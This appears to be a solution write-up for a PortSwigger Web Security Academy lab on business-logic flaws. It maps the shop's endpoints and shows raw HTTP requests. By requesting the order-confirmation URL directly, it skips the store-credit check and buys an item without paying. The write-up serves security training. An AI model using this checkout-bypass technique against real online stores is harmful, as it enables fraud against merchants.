# [Lab 7: Insufficient workflow validation](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation)

---

## Description

This lab makes flawed assumptions about the sequence of events in the purchasing workflow. To solve the lab, exploit this flaw to buy a "Lightweight l33t leather jacket".

You can log in to your own account using the following credentials: `wiener:peter`

---

## Solution

### Site Map

- `/`
	- Home page with links to products
- `/product?productId=$PRODUCT_ID`
	- Product page
- `/cart`
	- `GET`: Retrieve the current user's cart
		- Backend controls access via the `session` cookie
	- `POST`: Add item to cart
		- Backend uses `session` cookie to tie item to user's cart
		- When the user logs out, their cart is lost forever, even if they log back in. This seems to indicate that the application either:
			1. Ties a user's cart to the `session` cookie directly and whenever they log out, remove all items associated with that `session` cookie or
			2. Ties a user's cart to the `username` and whenever the user logs out, looks up the username associated with the `session` cookie and removes all items associated with that username
- `/cart/checkout`
	- `POST`: Place order
		- Backend uses `session` cookie to look up user's store credit to determine if they have sufficient funds
		- If they have sufficient funds, redirect to `/cart/order-confirmation?order-confirmed=true`
- `/cart/order-confirmation?order-confirmed=true`
	- Access controlled via `session` token
	- Appears to complete the transaction?
- `/login`
	- `GET`: Login form
	- `POST`: Submit credentials for authentication
- `/logout`
	- Invalidates the user's `session` cookie and redirects them to `/`
- `/my-account?id=$USERNAME`
	- Current user account page
	- Access controlled by `session` cookie


### Shopping Workflow

Login:

```http
POST /login HTTP/1.1
Host: ac221fbb1f50c494801d061d0012008d.web-security-academy.net
Cookie: session=d9Fo9zwENRyGI5iz8nmVoQrWKVh7DUca
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Origin: https://ac221fbb1f50c494801d061d0012008d.web-security-academy.net
Dnt: 1
Referer: https://ac221fbb1f50c494801d061d0012008d.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

csrf=s88goq8pMOVz3DSJ2MyHJWLAq1P6BvMA&username=wiener&password=peter
```

Add item to cart:

```http
POST /cart HTTP/1.1
Host: ac221fbb1f50c494801d061d0012008d.web-security-academy.net
Cookie: session=wuk6CNR13Fg6SFwMngWX5iIxtJiPTUb9
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: https://ac221fbb1f50c494801d061d0012008d.web-security-academy.net
Dnt: 1
Referer: https://ac221fbb1f50c494801d061d0012008d.web-security-academy.net/product?productId=1
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

productId=1&redir=PRODUCT&quantity=1
```

Results in a 302 redirect to `/product?productId=$PRODUCT_ID`.

Request for current user's cart:

```http
GET /cart HTTP/1.1
Host: ac221fbb1f50c494801d061d0012008d.web-security-academy.net
Cookie: session=wuk6CNR13Fg6SFwMngWX5iIxtJiPTUb9
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Dnt: 1
Referer: https://ac221fbb1f50c494801d061d0012008d.web-security-academy.net/product?productId=1
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close
```

Request to place order:

```http
POST /cart/checkout HTTP/1.1
Host: ac221fbb1f50c494801d061d0012008d.web-security-academy.net
Cookie: session=wuk6CNR13Fg6SFwMngWX5iIxtJiPTUb9
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Origin: https://ac221fbb1f50c494801d061d0012008d.web-security-academy.net
Dnt: 1
Referer: https://ac221fbb1f50c494801d061d0012008d.web-security-academy.net/cart
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

csrf=AJEPlibjJQBhIiTiQtEfnNxPQzBXV5OR
```

When not logged in, attempting to place an order results in a 303 redirect to `/cart?err=NOT_LOGGED_IN`.

![](images/Pasted%20image%2020210828215500.png)

Without sufficient funds, attempting to place an order results in a 303 redirect to `/cart?err=INSUFFICIENT_FUNDS`.

![](images/Pasted%20image%2020210828215754.png)

With sufficient funds, successfully placing an order results in a 302 redirect to `/cart/order-confirmation?order-confirmed=true`:

```http
GET /cart/order-confirmation?order-confirmed=true HTTP/1.1
Host: ac221fbb1f50c494801d061d0012008d.web-security-academy.net
Cookie: session=IUNp5Ah7lweJ520A0kiT4KwuA3Qn0oO9
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://ac221fbb1f50c494801d061d0012008d.web-security-academy.net/cart
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close
```

![](images/Pasted%20image%2020210828222803.png)


It appears that the `POST` to `/cart/checkout` is just responsible for ensuring the user has sufficient store credit and that this request is responsible for completing the transaction. Is it possible to bypass the store credit check and purchase a l33t leather jacket by adding it to the cart and them sending this request with the same `session` cookie?

Add the jacket to the cart:

```http
POST /cart HTTP/1.1
Host: ac221fbb1f50c494801d061d0012008d.web-security-academy.net
Cookie: session=IUNp5Ah7lweJ520A0kiT4KwuA3Qn0oO9
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: https://ac221fbb1f50c494801d061d0012008d.web-security-academy.net
Dnt: 1
Referer: https://ac221fbb1f50c494801d061d0012008d.web-security-academy.net/product?productId=1
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

productId=1&redir=PRODUCT&quantity=1
```

Complete the transaction:

```http
GET /cart/order-confirmation?order-confirmed=true HTTP/1.1
Host: ac221fbb1f50c494801d061d0012008d.web-security-academy.net
Cookie: session=IUNp5Ah7lweJ520A0kiT4KwuA3Qn0oO9
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://ac221fbb1f50c494801d061d0012008d.web-security-academy.net/cart
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close
```

![](images/Pasted%20image%2020210828223914.png)
